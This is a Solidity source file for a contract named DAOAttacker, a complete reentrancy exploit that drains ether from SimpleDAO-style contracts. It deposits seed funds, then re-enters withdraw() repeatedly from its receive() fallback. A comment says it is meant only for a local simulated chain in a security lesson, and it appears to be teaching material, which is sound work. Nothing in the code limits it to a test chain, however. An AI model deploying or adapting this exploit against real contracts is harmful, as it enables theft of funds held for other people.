// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ISimpleDAO {
    function donate(address to) external payable;
    function withdraw(uint256 amount) external;
}

/// @title Reentrancy attacker for SimpleDAO-style contracts
/// @notice Used only on a local simulated chain for a security lesson.
contract DAOAttacker {
    ISimpleDAO public immutable target;
    address public immutable operator;
    uint256 public chunk;
    uint256 public maxReentries;
    uint256 public reentryCount;

    event AttackStarted(uint256 deposit, uint256 maxReentries);
    event Reentered(uint256 count, uint256 targetBalance);

    constructor(address targetAddress) {
        target = ISimpleDAO(targetAddress);
        operator = msg.sender;
    }

    function attack(uint256 requestedReentries) external payable {
        require(msg.sender == operator, "operator only");
        require(msg.value > 0, "seed ether required");
        chunk = msg.value;
        maxReentries = requestedReentries;
        reentryCount = 0;

        emit AttackStarted(msg.value, requestedReentries);
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (reentryCount < maxReentries && address(target).balance >= chunk) {
            reentryCount += 1;
            emit Reentered(reentryCount, address(target).balance);
            target.withdraw(chunk);
        }
    }
}
